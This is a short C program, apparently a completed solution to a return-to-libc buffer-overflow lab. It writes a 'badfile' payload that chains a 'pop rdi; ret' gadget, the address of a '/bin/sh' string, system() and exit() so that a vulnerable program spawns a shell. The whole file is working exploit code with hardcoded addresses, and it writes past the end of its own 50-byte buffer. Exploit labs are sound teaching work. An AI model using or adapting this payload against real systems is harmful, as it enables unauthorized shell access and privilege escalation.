#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main(int argc, char ** argv)
{
char buf[50];
FILE * badfile;
badfile = fopen("./badfile", "w");
/*
You need to decide the addresses and
the values for X, Y, Z etc.
*/
*(long *) &buf[40] =  0x00007ffff7a53390;//system
*(long *) &buf[48] =  0x00007ffff7a48030;//exit
//*(long *) &buf[2] =  0x7ffff7ada700;//setuid
*(long *) &buf[24] =  0x00000000004006e3;//pop rdi; ret
*(long *) &buf[32] =  0x00007ffff7b9a177;//bin/sh/0
fwrite(buf, sizeof(buf), 1, badfile);
fclose(badfile);
}
